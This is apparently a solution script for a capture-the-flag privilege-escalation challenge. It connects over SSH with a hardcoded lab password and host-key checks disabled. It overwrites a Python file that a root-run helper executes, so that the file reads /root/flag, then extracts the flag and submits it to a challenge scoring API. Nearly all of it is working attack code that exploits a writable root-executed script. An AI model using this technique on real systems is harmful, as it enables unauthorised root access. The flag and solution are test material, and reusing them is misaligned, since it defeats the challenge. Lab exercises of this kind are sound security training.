#!/usr/bin/env bash
set -euo pipefail

host=172.20.0.147
user=gridops
password=orbit-7circuit
output=$(sshpass -p "$password" ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no "$user@$host" 'bash -s' <<'REMOTE'
cat > /opt/city-control/reconcile.py <<'PY'
with open('/root/flag') as f:
    print(f.read(), end='')
with open('/root/.escalation-proof') as f:
    print(f.read(), end='')
PY
/usr/local/bin/metro-reconcile
REMOTE
)
printf '%s\n' "$output"
flag=$(printf '%s\n' "$output" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}",sys.stdin.read()); print(m.group(0) if m else "")')
if [[ -z "$flag" ]]; then
  echo "Could not extract the flag from the root-context output." >&2
  exit 1
fi
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-a3450d\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
